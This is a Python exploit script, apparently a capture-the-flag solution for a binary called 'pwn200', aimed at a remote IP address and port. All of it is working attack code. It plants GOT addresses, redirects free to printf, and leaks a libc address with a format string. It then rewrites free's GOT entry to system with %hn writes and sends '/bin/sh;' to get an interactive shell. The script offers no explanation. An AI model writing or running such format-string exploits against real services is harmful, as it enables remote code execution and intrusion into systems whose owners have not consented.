from zio import *

target = "./pwn200"
target = ("119.28.63.211", 2333)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return io

def pwn(io):
	io.read_until("u?\n")
	#io.gdb_hint()
	read_got                   = 0x0000000000602038
	free_got                   = 0x0000000000602018
	atoi_got                   = 0x0000000000602060
	strcpy_got                 = 0x0000000000602020

	#name_addr : 0x7fffc87784f0
	#rbp : 0x7fffc8778520
	#money buff : 0x7fffc8778540
	payload = ""
	payload += l64(read_got)
	payload += l64(strcpy_got+0)
	payload += l64(strcpy_got+2)
	payload += l64(free_got+0)

	io.writeline(payload)
	#io.write("1"*48)
	#io.read_until('1'*48)
	#data = io.read_until(", welcome")[:-len(", welcome")]
	#rbp = l64(data[:8].ljust(8, '\x00'))
	#print "rbp:", hex(rbp)
	io.read_until("?\n")
	io.writeline("123")
	io.read_until("~\n")

	malloc_got = 0x0000000000602050
	printf_plt                 = 0x0000000000400640
	strcpy_plt                 = 0x0000000000400620

	payload = ""
	payload += l64(printf_plt)
	payload = payload.ljust(56, '\x00')
	payload += l64(free_got)

	io.write(payload)

	io.read_until("choice : ")
	io.writeline("2")

	io.read_until("choice : ")
	io.writeline("1")
	io.read_until("long?\n")
	io.writeline(str(0x80))
	io.read_until(" : ")
	io.read_until("\n128\n")
	payload = ""
	payload += "%26$s--..--"
	io.write(payload)
	io.read_until("choice : ")
	io.writeline("2")
	io.read_until("out~\n")
	data = io.read_until("--..--")[:-6]
	read_addr = l64(data[:8].ljust(8, '\x00'))
	print "read_addr:", hex(read_addr)

	offset_read                = 0xeb530
	offset_system = 0x44c40

	offset_system = 0x00000000000468f0
	offset_dup2 = 0x00000000000ece70
	offset_read = 0x00000000000ec690
	offset_write = 0x00000000000ec6f0

	libc_base = read_addr - offset_read
	system_addr = libc_base + offset_system


	io.read_until("choice : ")
	io.writeline("1")
	io.read_until("long?\n")
	io.writeline(str(0x80))
	io.read_until(" : ")
	io.read_until("\n128\n")

	print "system_addr:", hex(system_addr)
	high_part = (system_addr&0xffff0000)>>16
	low_part = system_addr&0x0000ffff
	if low_part > high_part:
		high_part += 0x10000

	print hex(low_part)
	print hex(high_part) 
	payload = ""
	payload += "%%%dc%%29$hhn"%(0x20)
	payload += "%%%dc%%27$hn"%(low_part-0x20)
	payload += "%%%dc%%28$hn"%(high_part - low_part)

	print payload

	io.write(payload)

	io.read_until("choice : ")
	io.gdb_hint()
	io.writeline("2")

	io.read_until("choice : ")
	io.writeline("1")
	io.read_until("long?\n")
	io.writeline(str(0x80))
	io.read_until(" : ")
	io.read_until("\n128\n")
	io.writeline("/bin/sh;")

	io.read_until("choice : ")
	io.writeline("2")

	io.interact()


io = get_io(target)
pwn(io)

